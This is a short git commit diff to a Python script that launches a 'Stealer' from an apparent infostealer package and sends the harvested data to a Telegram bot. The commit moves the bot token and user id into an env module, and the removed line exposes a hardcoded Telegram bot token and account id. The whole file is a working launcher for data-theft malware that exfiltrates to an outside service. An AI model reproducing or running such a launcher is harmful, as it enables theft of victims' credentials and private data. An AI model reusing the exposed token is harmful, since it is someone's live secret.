aa7e32d65808b66a18dc02f80570d78a272bc2d2
user-sspmynxdvb <132933165+user-sspmynxdvb@users.noreply.github.com>
2024-04-24 09:11:51 +0300

    env

--- t.py
+++ t.py
@@ -1,5 +1,6 @@
 from stink import Stealer
 from stink.modules import TelegramSender
+from env import *
 
 if __name__ == "__main__":
-    Stealer(sender=TelegramSender(token="7197063868:AAHZ1zdHOZvh0UeYZxQO6wtJjieoz6TGCdc", user_id=6349365242)).run()
+    Stealer(sender=TelegramSender(token=token, user_id=id)).run()
